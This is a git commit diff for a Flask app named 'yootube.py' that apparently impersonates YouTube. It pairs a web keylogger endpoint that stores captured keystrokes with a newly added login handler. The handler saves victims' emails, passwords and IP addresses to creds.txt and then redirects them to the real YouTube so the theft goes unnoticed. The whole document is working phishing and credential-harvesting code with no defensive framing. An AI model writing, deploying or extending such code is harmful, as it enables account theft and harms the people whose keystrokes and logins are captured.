534e664d5d6f1b3f692e129a1def3825959d6ba2
fisayobtw <fisayo141@gmail.com>
2025-08-12 22:47:42 -0400

    updated files

--- yootube.py
+++ yootube.py
@@ -1,14 +1,16 @@
-from flask import Flask, request
+from flask import Flask, request, render_template, redirect
 from datetime import datetime
 
 app = Flask(__name__)
 log_file = "web_keylog.txt"
+creds_file = "creds.txt"
 
 open(log_file, "w").close()
+open(creds_file, "w").close()
 
 @app.route("/")
 def index():
-    return open("index.html").read()
+    return render_template("index.html")
 
 @app.route("/log", methods=["POST"])
 def log_key():
@@ -18,6 +20,20 @@ def log_key():
     with open(log_file, "a") as f:
         f.write(f"[{timestamp}] {key}\n")
     return "", 204
+
+@app.route("/login", methods=["POST"])
+def login():
+    email = request.form.get("email")
+    password = request.form.get("password")
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    with open("creds.txt", "a") as f:
+        f.write(f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password}\n")
+
+    # redirect
+    return redirect("https://www.youtube.com")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
